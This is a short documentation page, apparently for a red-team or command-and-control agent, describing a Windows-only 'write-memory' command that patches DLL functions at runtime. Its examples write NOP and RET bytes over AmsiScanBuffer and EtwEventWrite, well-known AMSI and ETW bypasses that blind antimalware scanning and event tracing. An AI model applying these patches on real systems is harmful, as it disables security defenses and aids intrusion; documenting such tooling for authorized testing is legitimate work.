+++
title = "write-memory"
chapter = false
weight = 103
hidden = false
+++

{{% notice info %}}
Windows Only
{{% /notice %}}

## Summary

Write bytes to a DLL function's memory address. Can be used to patch functions at runtime, such as AMSI or ETW bypasses.

### Arguments

#### dll_name
Name of the DLL (e.g., `amsi`, `ntdll`).

#### function_name
Name of the function to write to.

#### start_index
Byte offset from the start of the function.

#### hex_bytes
Hex string of bytes to write (no `0x` prefix, no spaces).

## Usage
```
write-memory <dll_name> <function_name> <start_index> <hex_bytes>
```

Example
```
write-memory amsi AmsiScanBuffer 0 909090
write-memory ntdll EtwEventWrite 0 C3
```

## MITRE ATT&CK Mapping

- T1055
